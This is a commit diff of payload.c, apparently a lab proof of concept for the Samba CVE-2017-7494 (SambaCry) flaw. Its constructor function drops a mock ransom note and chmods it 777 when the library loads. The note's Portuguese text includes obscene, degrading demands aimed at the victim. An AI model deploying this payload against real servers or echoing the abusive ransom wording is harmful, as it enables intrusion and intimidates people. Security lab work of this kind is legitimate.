0515397ce0c3e5c0897263450524e52777ecbabd
FelipeR-UFBA <feliperosario@ufba.br>
2025-11-10 14:33:11 -0500

    update 3

--- payload.c
+++ payload.c
@@ -2,17 +2,19 @@
 #include <stdlib.h>
 
 void __attribute__((constructor)) poc_exploit() {
-    FILE *f = fopen("/home/sambacry/LEIA_ME_SEUS_FICHEIROS_FORAM_CIFRADOS.txt", "w");
-    if (f == NULL) {       
-        return;
+    
+    FILE *f = fopen("/data/LEIA_ME_SEUS_FICHEIROS_FORAM_CIFRADOS.txt", "w");
+    
+    if (f == NULL) {
+        return; 
     }
     
     fprintf(f, "------------------------------------\n");
     fprintf(f, "OLA, O SEU SISTEMA FOI COMPROMETIDO!\n\n");
     fprintf(f, "Isto é uma prova de conceito para o lab HackInSDN.\n");
-    fprintf(f, "O seu serviço Samba estava vulnerável ao CVE-2017-7494, coma merda na frente da webcam imediatamente para recuperar seus arquivos.\n");
+    fprintf(f, "O seu serviço Samba estava vulnerável ao CVE-2017-7494 (SambaCry). CAGE AGORA MESMO NA SUA MAO E COMA SUA PROPRIA BOSTA, ESSA É A UNICA MANEIRA DE RECUPERAR SEUS ARQUIVOS.\n");
     fprintf(f, "------------------------------------\n");
     fclose(f);
     
-    system("chmod 777 /home/sambacry/LEIA_ME_SEUS_FICHEIROS_FORAM_CIFRADOS.txt");
+    system("chmod 777 /data/LEIA_ME_SEUS_FICHEIROS_FORAM_CIFRADOS.txt");
 }
